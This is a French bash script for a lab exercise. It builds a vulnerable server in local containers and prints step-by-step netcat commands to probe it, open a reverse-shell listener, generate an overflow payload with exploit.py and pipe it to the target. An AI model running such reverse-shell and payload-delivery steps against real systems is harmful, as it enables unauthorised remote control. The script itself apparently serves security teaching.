#!/bin/bash
# T8 - Exploitation a distance (Serveur, E9)
# ATTENTION : ce script ouvre des terminaux interactifs / processus qui
# bloquent (dcup, nc -l). Suivez les instructions affichees plutot que
# de lancer tout le fichier d'un coup sans l'avoir lu.
source "$(dirname "$0")/00_config.sh" || exit 1

echo "=== T8 : build + demarrage des conteneurs (ce terminal) ==="
cd "$E9/server-code" || exit 1
make
make install                 # copie dans $E9/bof-containers
cd "$E9" || exit 1
dcbuild
dcup
# laisser ce terminal ouvert ; ouvrir un 2e et un 3e terminal pour la suite

echo "--- Dans un 2e terminal : reconnaissance ---"
echo 'echo hello | nc 10.9.0.5 9090'
echo "RECORD: ebp / &buffer affiches dans le terminal de dcup - puis CTRL+C"

echo "--- Dans un 3e terminal : listener pour le shell inverse ---"
echo 'nc -nv -l 9090'

echo "--- Dans le 2e terminal : lancer l'exploit ---"
echo "cd $E9/attack-code"
echo 'python3 exploit.py'
echo 'cat badfile | nc 10.9.0.5 9090'
echo "RECORD: dans le 3e terminal - connexion recue + id dans le shell distant"
